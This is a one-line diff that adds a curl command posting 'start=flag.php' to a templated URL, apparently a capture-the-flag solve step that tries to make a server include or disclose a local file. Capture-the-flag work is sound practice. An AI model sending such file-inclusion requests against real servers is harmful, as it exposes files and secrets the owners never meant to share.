@@ -1,0 +1,1 @@
+curl 'http://{url}/?start=' --data 'start=flag.php'
